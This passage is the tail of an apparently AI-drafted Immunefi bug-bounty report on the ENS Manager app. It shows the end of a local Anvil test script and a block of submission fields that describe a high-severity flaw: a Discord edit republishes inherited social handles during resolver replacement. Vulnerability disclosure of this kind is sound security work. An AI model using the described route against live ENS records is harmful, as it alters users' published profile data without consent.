    mined_input_byte_identical_to_app_calldata: ($minedInput == $appCalldata),
    settled_owner: $ownerNow, settled_resolver: $resolverNow,
    blocks: { start: $startBlock, final: $finalBlock },
    old_resolver_texts_after: $oldTexts,
    new_resolver_texts_after: $newTexts
  }' > "$OUT_JSON"

echo "[*] wrote $OUT_JSON"
jq '.new_resolver_texts_after' "$OUT_JSON"
echo "[*] alternative-route assertions passed: 9 carried socials + intended com.discord; description and two untouched controls remain empty"
```

***

**Submission fields (copy/paste)**

* **Title:** Immunefi submission - A Contact-tab Discord edit republishes inherited social handles through Manager's resolver replacement
* **Asset:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Severity:** High
* **Impact selection(s):**
* Injecting/modifying the static content on the target application without JavaScript (persistent), such as: - HTML injection without JavaScript - Replacing existing text with arbitrary text - Arbitrary file uploads, etc.
* **Description (submit verbatim):** Use the complete Description body already contained in this file: the contiguous material beginning at `## Brief/Intro` and ending at the last line of `## References`. It includes the Brief/Intro, Vulnerability Details, Impact Details, and References sections, including the frozen revision, source locations, measured impact, route limits, and duplicate/known-issue boundary. Do not replace it with a summary or omit any paragraph.
* **Proof of Concept (submit verbatim):** Use the complete PoC body already contained in this file: the contiguous material beginning at `## Proof of Concept` and ending immediately before this Submission fields block. It includes prerequisites, commands, expected outputs, three local Anvil runs, semantic-state comparison, safety limits, route-search evidence, execution notes, and the complete embedded TypeScript and Shell sources. The embedded sources are sufficient to regenerate the application calldata and replay it locally; no hidden file is required.
* **Supporting code (optional attachment):** The authoritative reproduction source is embedded in this same file under the three labeled embedded-file blocks (`manager-profile-social-carryover-alt.test.tsx`, `setup-poc-env-profile-alt.sh`, and `onchain-lifecycle-alt.sh`). The external `profile-route-poc/` directory is an optional convenience attachment containing byte-checked copies, artifacts, logs, and `SHA256SUMS.txt`; it is not required to understand or reproduce the report when the embedded blocks are extracted.
* **Attachments:** None required. If the platform accepts supplementary files, attach `profile-route-poc/` as an optional evidence bundle; its files are authenticated by `profile-route-poc/SHA256SUMS.txt` and do not change the submitted Description or PoC.
* **External submission:** Not performed. This document is a local, submission-ready draft; uploading it or attaching the optional bundle still requires the user's separate platform action.
